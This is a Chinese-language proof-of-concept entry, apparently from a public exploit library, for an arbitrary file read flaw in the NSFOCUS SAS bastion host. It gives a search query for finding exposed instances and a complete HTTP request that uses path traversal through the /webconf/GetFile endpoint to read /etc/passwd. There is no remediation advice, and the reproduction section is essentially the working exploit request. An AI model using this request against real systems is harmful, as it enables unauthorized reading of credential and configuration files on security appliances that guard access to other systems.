---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 绿盟SAS堡垒机GetFile任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">绿盟堡垒机后台存在任意文件读取漏洞，攻击者可通过/webconf/GetFile 接口进行任意文件读取。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 绿盟SAS堡垒机

# 三、资产测绘
+ hunter`app.name="NSFOCUS 绿盟 SAS"`


+ 登录页面


# 四、漏洞复现
```plain
GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=4d44c08bdf4492b7877f79ffa7122d3c
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cz6wgk0d6xpv4lmz>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
